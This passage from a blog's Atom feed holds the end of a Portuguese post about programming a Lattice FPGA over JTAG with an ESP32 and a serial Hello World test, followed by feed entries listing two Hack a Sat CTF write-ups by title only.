  <blockquote class="twitter-tweet"><p lang="en" dir="ltr">FINALLY. Now I can use the ESP32 as JTAG programmer for Lattice FPGA. Soon I will able to program through wifi and pipe a serial debug port as well. <a href="https://t.co/zs41v47BvU">pic.twitter.com/zs41v47BvU</a></p>&mdash; Cybernetic Lover (@lucasteske) <a href="https://twitter.com/lucasteske/status/1272019368617095173?ref_src=twsrc%5Etfw">June 14, 2020</a></blockquote> <script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
</center>

<p>Eu tamb√©m adicionei um comando para fazer o ESP32 mudar do modo de programa√ß√£o para o passthorugh serial. Desta maneira, ap√≥s a grava√ß√£o do FPGA, todas as chamadas serial seriam redirecionadas para o FPGA. Para testar eu fiz esse pequeno Hello World Serial:
<a href="https://github.com/racerxdl/fpga-serial-hello"><strong>racerxdl/fpga-serial-hello</strong></a></p>

<p>O qual fica enviando a mensagem ‚ÄúHello World‚Äù pela porta serial para sempre. E funciona!
Which basically keeps sending Hello World through the serial port forever.</p>

<p><img src="/assets/posts/medium/1_Z8RdW5i7NQh7KUEC5v5NFg.png" alt="Sa√≠da do Hello World do FPGA" /><em>Sa√≠da do Hello World do FPGA</em></p>

<p>Meu pr√≥ximo passo √© fazer funcionar via rede. Vai ser muito bom poder gravar o FPGA via rede e usar a porta serial.</p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="FPGA" /><category term="ESP32" /><category term="Hacking" /><category term="FPGA" /><category term="ICEWolf" /><category term="IceStick" /><category term="ECP5" /><category term="Lattice" /><category term="ESP32" /><category term="Colorlight" /><summary type="html"><![CDATA[Hackeando um ESP32 num FPGA]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_ALnLx9L06FSciqeEV5OCuQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Talk to me, Goose</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/" rel="alternate" type="text/html" title="Hack a Sat - Talk to me, Goose" /><published>2020-05-31T22:02:00+00:00</published><updated>2020-05-31T22:02:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goos</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-talk-to-me-goose/"><![CDATA[<p>Somente dispon√≠vel em <a href="/2020/05/hack-a-sat-talk-to-me-goose/">Ingl√™s</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="XTCE" /><summary type="html"><![CDATA[Somente dispon√≠vel em Ingl√™s]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_b23VUAe-7ZvnQF4MIZO73A.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Hack a Sat - Phasors to Stun</title><link href="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/" rel="alternate" type="text/html" title="Hack a Sat - Phasors to Stun" /><published>2020-05-30T16:15:00+00:00</published><updated>2020-05-30T16:15:00+00:00</updated><id>https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun</id><content type="html" xml:base="https://lucasteske.dev/2020/05/hack-a-sat-phasors-to-stun/"><![CDATA[<p>Somente dispon√≠vel em <a href="/2020/05/hack-a-sat-phasors-to-stun/">Ingl√™s</a></p>]]></content><author><name>Lucas Teske</name></author><category term="English" /><category term="Hacking" /><category term="Linux" /><category term="CTF" /><category term="SDR" /><category term="Camera" /><category term="Hacking" /><category term="CTF" /><category term="Hackasat" /><category term="CTF Writeup" /><category term="Satellite" /><category term="SDR" /><category term="GNU Radio" /><category term="Radio" /><summary type="html"><![CDATA[Somente dispon√≠vel em Ingl√™s]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/medium/1_R1n7vaNfInOP6BCFXkjv1Q.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>